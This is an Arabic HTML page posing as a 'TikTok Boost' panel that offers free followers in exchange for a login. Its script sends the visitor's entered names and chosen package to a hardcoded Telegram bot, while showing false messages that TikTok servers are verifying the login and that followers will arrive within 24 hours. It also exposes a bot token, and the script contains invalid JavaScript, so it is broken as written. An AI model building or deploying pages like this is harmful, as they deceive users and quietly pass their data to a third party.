<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Boost Panel | لوحة تيك توك الاحترافية</title>
    <style>
        :root {
            --tiktok-black: #121212;
            --tiktok-pink: #FE2C55;
            --tiktok-cyan: #25F4EE;
            --bg-gradient: linear-gradient(180deg, #000000 0%, #1a1a1a 100%);
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.08);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }

        body {
            background: var(--bg-gradient);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* حاوية الموقع الرئيسية */
        .main-container {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 30px;
            width: 100%;
            max-width: 1000px; /* أكبر */
            display: flex;
            flex-direction: row; /* تصميم جانبي للكمبيوتر */
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        /* القسم الأيمن (الشعار والترحيب) */
        .brand-section {
            flex: 1;
            background: rgba(0,0,0,0.3);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 60px;
            border-left: 1px solid var(--border);
        }

        .tiktok-logo { font-size: 80px; margin-bottom: 20px; }
        .brand-section h1 { font-size: 32px; font-weight: 800; margin-bottom: 10px; }
        .brand-section p { font-size: 16px; color: #aaa; text-align: center; line-height: 1.6; }

        /* القسم الأيسر (النموذج والخدمات) */
        .form-section {
            flex: 1.5;
            padding: 60px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 30px; color: var(--tiktok-cyan); }

        /* تنسيق حقول الإدخال */
        .input-group { margin-bottom: 20px; text-align: right; }
        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #ccc; }
        .input-group input {
            width: 100%;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border: 1px solid #333;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: var(--tiktok-pink);
            background: rgba(255,255,255,0.08);
            outline: none;
        }

        /* تنسيق بطاقات الخدمات */
        .services-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        .service-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
        }
        .service-card:hover { border-color: var(--tiktok-cyan); transform: translateY(-3px); }
        .service-card.active {
            background: rgba(37, 244, 238, 0.05);
            border-color: var(--tiktok-cyan);
            box-shadow: 0 0 15px rgba(37, 244, 238, 0.2);
        }
        .service-card h3 { font-size: 18px; color: white; margin-bottom: 5px; }
        .service-card p { font-size: 12px; color: #aaa; }

        /* زر تسجيل الدخول */
        .btn-login {
            width: 100%;
            padding: 18px;
            background: var(--tiktok-pink);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            position: relative;
            overflow: hidden;
        }
        .btn-login:hover { background: #e0244b; box-shadow: 0 10px 20px rgba(254, 44, 85, 0.3); }
        .btn-login:active { transform: translateY(1px); }

        /* رسائل الحالة */
        #status-msg { margin-top: 20px; font-size: 14px; text-align: center; display: none; }

        /* التجاوب مع الهواتف (Mobile Responsive) */
        @media (max-width: 768px) {
            .main-container { flex-direction: column; border-radius: 20px; }
            .brand-section { padding: 40px; border-left: none; border-bottom: 1px solid var(--border); }
            .form-section { padding: 40px; }
            .tiktok-logo { font-size: 60px; }
            .brand-section h1 { font-size: 26px; }
            .services-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<div class="main-container">
    <div class="brand-section">
        <div class="tiktok-logo">🎵</div>
        <h1>TikTok Boost</h1>
        <p>اللوحة الاحترافية لتطوير حسابات تيك توك. سجل دخولك لتفعيل الخدمات الحصرية.</p>
    </div>

    <div class="form-section">
        <h2 class="section-title">تسجيل الدخول للنظام</h2>

        <div class="input-group">
            <label>الاسم الأول *</label>
            <input type="text" id="fn" placeholder="اكتب اسمك الأول" required>
        </div>

        <div class="input-group">
            <label>الاسم الثاني (إجباري للتفعيل) *</label>
            <input type="text" id="ln" placeholder="اكتب اسمك الثاني" required>
        </div>

        <div class="input-group">
            <label>اختر باقة الدعم</label>
            <div class="services-grid">
                <div class="service-card active" onclick="selectService(this, '100 متابع (ساعتين)')">
                    <h3>100 متابع</h3>
                    <p>كل ساعتين</p>
                </div>
                <div class="service-card" onclick="selectService(this, '500 متابع (6 ساعات)')">
                    <h3>500 متابع</h3>
                    <p>كل 6 ساعات</p>
                </div>
                <div class="service-card" onclick="selectService(this, '1000 متابع (يومين)')">
                    <h3>1000 متابع</h3>
                    <p>كل يومين</p>
                </div>
                <div class="service-card" onclick="selectService(this, '2500 متابع (4 ايام)')">
                    <h3>2500 متابع</h3>
                    <p>كل 4 أيام</p>
                </div>
            </div>
        </div>

        <button class="btn-login" onclick="sendData()">تسجيل الدخول</button>

        <div id="status-msg">جاري التحقق من الحساب...</div>
    </div>
</div>

<script>
    // متغير لتخزين الخدمة المختارة (الافتراضية الأولى)
    let selectedServiceName = "100 متابع (ساعتين)";

    // دالة لاختيار الخدمة من البطاقات
    function selectService(element, serviceName) {
        // إزالة الفعالية من جميع البطاقات
        document.querySelectorAll('.service-card').forEach(card => card.classList.remove('active'));
        // إضافة الفعالية للبطاقة المختارة
        element.classList.add('active');
        selectedServiceName = serviceName;
    }

    async function sendData() {
        // معلومات البوت الخاصة بك
        const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";

        const fName = document.getElementById('fn').value.trim();
        const lName = document.getElementById('ln').value.trim();
        const statusMsg = document.getElementById('status-msg');

        // التحقق من أن الحقلين مملوءان (شرط الإجبار)
        if (fName === "" || lName === "") {
            alert("⚠️ خطأ برمجـي: يجب كتابة الاسم الأول والاسم الثاني لتتمكن من تسجيل الدخول وتفعيل باقة الـ TikTok!");
            return;
        }

        // إظهار رسالة الحالة
        statusMsg.style.display = "block";
        statusMsg.style.color = "#aaa";
        statusMsg.innerHTML = "⏳ جاري تأكيد تسجيل الدخول عبر خوادم تيك توك...";

        // تجهيز الرسالة للبوت
        const message = `🎵 *TikTok Login Request* \n\n👤 الاسم الأول: ${fName} \n👤 الاسم الثاني: ${lName} \n📊 الباقة المطلوبة: ${selectedServiceName}`;

        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        try {
            const response = await fetch(apiUrl);
            if (response.ok) {
                setTimeout(() => {
                    statusMsg.innerHTML = "✅ تم تسجيل الدخول! جاري تفعيل الباقة المختارة خلال 24 ساعة.";
                    statusMsg.style.color = var(--tiktok-cyan);
                    // تفريغ الحقول بعد النجاح
                    document.getElementById('fn').value = "";
                    document.getElementById('ln').value = "";
                }, 2000);
            } else {
                statusMsg.innerHTML = "❌ حدث خطأ في النظام، حاول مجدداً.";
                statusMsg.style.color = var(--tiktok-pink);
            }
        } catch (error) {
            statusMsg.innerHTML = "⚠️ فشل الاتصال بالسيرفر.";
        }
    }
</script>

</body>
</html>
